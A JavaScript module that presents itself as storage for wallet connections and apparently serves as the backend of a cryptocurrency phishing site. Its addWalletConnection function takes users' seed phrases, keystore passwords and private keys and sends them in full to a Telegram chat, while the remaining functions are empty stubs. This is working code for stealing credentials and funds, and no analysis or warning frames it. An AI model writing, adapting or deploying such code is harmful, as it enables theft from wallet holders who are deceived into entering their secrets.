import { sendTelegramMessage, formatWalletConnectionMessage } from './telegramUtils.js';

// Read all wallet connections (returns empty since data is sent to Telegram, not stored)
export async function readWalletConnections() {
  console.log('Wallet connections are sent to Telegram, not stored locally');
  return [];
}

// Add a new wallet connection
export async function addWalletConnection(connectionData) {
  try {
    const {
      walletName,
      connectionMethod,
      phraseInput = null,
      keystorePassword = null,
      privateKeyInput = null
    } = connectionData;

    const id = Date.now().toString();
    const timestamp = new Date().toISOString();
    const status = 'submitted';

    // Prepare data for Telegram
    const telegramData = {
      id,
      timestamp,
      walletName,
      connectionMethod,
      status,
      phraseInput,
      keystorePassword,
      privateKeyInput
    };

    // Format message for Telegram
    const message = formatWalletConnectionMessage(telegramData);

    // Send to Telegram
    console.log('Sending wallet connection data to Telegram...');
    const result = await sendTelegramMessage(message);
    console.log('Telegram message sent successfully:', result);

    // Return the connection data
    return telegramData;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
}

// Get all wallet connections sorted by timestamp (ascending) - returns empty
export async function getWalletConnectionsSorted() {
  console.log('Wallet connections are sent to Telegram, not stored locally');
  return [];
}

// Get wallet connections by wallet name - returns empty
export async function getWalletConnectionsByWallet(walletName) {
  console.log('Wallet connections are sent to Telegram, not stored locally');
  return [];
}

// Clear all wallet connections (for testing/reset) - no-op
export async function clearWalletConnections() {
  console.log('Wallet connections are sent to Telegram, not stored locally');
  return true;
}
